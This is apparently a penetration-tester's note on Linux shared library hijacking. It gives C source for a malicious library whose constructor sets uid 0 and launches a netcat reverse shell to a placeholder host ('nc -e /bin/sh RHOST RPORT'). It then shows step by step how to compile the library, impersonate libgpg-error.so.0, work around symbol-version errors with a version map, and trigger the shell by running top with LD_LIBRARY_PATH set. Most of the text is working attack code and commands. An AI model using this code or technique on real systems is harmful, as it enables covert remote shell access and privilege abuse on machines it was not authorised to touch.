```
#include <stdio.h>
#include <stdlib.h>

#include <sys/types.h>

#include <unistd.h>

 

static void revShell() __attribute__((constructor));

 

void revShell() {

                  setuid(0);

                  setgid(0);

                  printf("Reverse Shell via library hijacking... \n");

                                    const char *ncshell = "nc -e /bin/sh RHOST RPORT &";

                  system(ncshell);

}
```

```
kali㉿kali)-[~/ldlib]
└─$ gcc -Wall -fPIC -c -o hax.o hax.c
┌──(kali㉿kali)-[~/ldlib]
└─$ gcc -shared -o libhax.so hax.o
```

run LDD command in the target machine on
the top program. This will give us information on which libraries are
being loaded when top is being run.
```

┌──(kali㉿kali)-[~/ldlib]
└─$ ldd /usr/bin/top
        linux-vdso.so.1 (0x00007ffd135c5000)
        libprocps.so.6 => /lib/x86_64-linux-gnu/libprocps.so.6 (0x00007ff5ab935000)
        libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007ff5ab70b000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff5ab507000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff5ab116000)
        libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007ff5aae92000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff5abd9b000)
        librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007ff5aac8a000)
        liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007ff5aaa64000)
        liblz4.so.1 => /usr/lib/x86_64-linux-gnu/liblz4.so.1 (0x00007ff5aa848000)
        libgcrypt.so.20 => /lib/x86_64-linux-gnu/libgcrypt.so.20 (0x00007ff5aa52c000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff5aa30d000)
**libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)**
```

Will hijack the error reporting library since it will always be loaded.

```
┌──(kali㉿kali)-[~/ldlib]
└─$ export LD_LIBRARY_PATH=/home/offsec/ldlib/

┌──(kali㉿kali)-[~/ldlib]
└─$ cp libhax.so libgpg-error.so.0
Troubleshooting:
Incase of error: ┌──(kali㉿kali)-[~/ldlib] 
						└─top
top: /home/kali/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference

┌──(kali㉿kali)-[~/ldlib]
└─$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
int gpgrt_fflush;
int gpgrt_poll;
```

Place in the .c recompile
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
```

Not all supporting libraries require
version information, so this does not always occur
```
┌──(kali㉿kali)-[~/ldlib]
└─$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_feof_unlocked;
gpgrt_vbsprintf;
...
```

"wrap" into
a symbol map file for the compiler to use. 
```

GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;

};

```

```
┌──(kali㉿kali)-[~/ldlib]
└─$ gcc -Wall -fPIC -c -o hax.o hax.c
kali㉿kali)-[~/ldlib]
└─$ gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o

```

```
┌──(kali㉿kali)-[~/ldlib]
└─$ export LD_LIBRARY_PATH=/home/kali/ldlib/
```

```
┌──(kali㉿kali)-[~/ldlib]
└─$ top
Reverse Shell via library hijacking
top - 14:55:15 up 9 days,  4:35,  2 users,  load average: 0.01, 0.01, 0.00
Tasks: 164 total,   1 running,  92 sleeping,   0 stopped,   0 zombie
...

```

reference:
https://diconium.com/en/blog/cybersecurity/abusing-shared-libraries-for-malicious-gains
